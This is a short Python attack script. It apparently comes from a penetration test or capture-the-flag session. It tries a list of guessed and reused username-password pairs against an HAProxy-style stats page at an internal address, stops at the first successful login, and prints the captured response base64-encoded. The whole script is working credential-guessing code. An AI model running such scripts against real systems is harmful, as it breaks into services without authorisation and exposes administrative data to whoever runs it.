import socket,base64
out=[]
def req(user,pw):
    try:
        auth=base64.b64encode(f"{user}:{pw}".encode()).decode()
        s=socket.socket();s.settimeout(4)
        s.connect(("172.18.0.1",8404))
        s.sendall(f"GET /stats HTTP/1.1\r\nHost: localhost\r\nAuthorization: Basic {auth}\r\nConnection: close\r\n\r\n".encode())
        d=s.recv(2000)
        s.close()
        return d
    except Exception as e:
        return f"ERR:{e}".encode()

# Contextual credential reuse (infra pattern: admin123, Passwd2024!, kelvin, user)
creds=[
    ("admin","admin123"),("admin","Passwd2024!"),("stats","stats"),
    ("admin","admin"),("haproxy","haproxy"),("stats","Passwd2024!"),
    ("admin","stats"),("stats","admin123"),("quant","Passwd2024!"),("kelvin","kelvin"),
]
for u,p in creds:
    r=req(u,p)
    if b"200 OK" in r:
        out.append(f"HIT {u}:{p}")
        out.append(r[:1500].decode('utf-8','ignore'))
        break
    elif b"401" not in r:
        out.append(f"{u}:{p} -> {r[:80]}")

print(base64.b64encode(("\n".join(out) if out else "NO_AUTH_HIT").encode()).decode())
